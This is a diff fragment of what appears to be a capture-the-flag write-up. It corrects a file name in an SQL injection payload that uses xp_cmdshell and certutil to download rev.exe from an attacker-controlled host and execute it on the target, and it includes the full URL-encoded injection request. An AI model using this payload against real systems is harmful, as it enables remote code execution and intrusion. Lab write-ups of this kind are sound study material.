@@ -44,7 +44,7 @@ python -m http.server 8888
 Download and execute the rev.exe on the target machine through SQL injection.
 Payload:
 ```bash
-'; EXEC xp_cmdshell 'certutil -urlcache -f http://10.8.170.28:8888/rev.exe C:\Windows\Temp\met.exe'; EXEC xp_cmdshell 'C:\Windows\Temp\rev.exe';--
+'; EXEC xp_cmdshell 'certutil -urlcache -f http://10.8.170.28:8888/rev.exe C:\Windows\Temp\rev.exe'; EXEC xp_cmdshell 'C:\Windows\Temp\rev.exe';--
 http://10.10.234.198/giftresults.php?age=teenager%27;%20EXEC%20xp_cmdshell%20%27certutil%20-urlcache%20-f%20http://10.8.170.28:8888/rev.exe%20C:\Windows\Temp\rev.exe%27;%20EXEC%20xp_cmdshell%20%27C:\Windows\Temp\rev.exe%27;--&interests=toys&budget=80
 ```
 
